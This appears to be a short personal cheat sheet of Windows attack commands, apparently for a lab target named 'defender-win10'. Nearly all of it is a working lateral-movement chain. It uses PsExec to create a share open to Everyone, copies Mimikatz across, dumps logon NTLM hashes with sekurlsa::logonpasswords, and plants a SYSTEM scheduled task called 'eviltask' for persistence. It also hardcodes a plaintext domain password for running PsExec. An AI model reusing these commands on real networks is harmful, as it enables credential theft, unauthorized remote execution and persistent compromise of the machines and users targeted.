"remotly run"
"Create Share"
c:\exploit\pstools\psexec.exe  \\defender-win10 cmd.exe /c "mkdir c:\exploit &net share ShareName=c:\exploit /grant:Everyone,FULL "

"Copy Mimikatz"
net use z: \\defender-win10\c$\users\dddolev\exploit
xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y


"Run Mimikatz"
c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command "c:\exploit\mimikatz\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+: .*'> c:\exploit\mimiout.txt"'



"Creating precistance"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr c:\exploit\evil.exe /ru "SYSTEM" /s defender-win10


$password = 'Cato2023!'
$user = "sec.content\danny"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c 'mkdir c:\exploit &net share ShareName=c:\exploit /grant:Everyone,FULL '"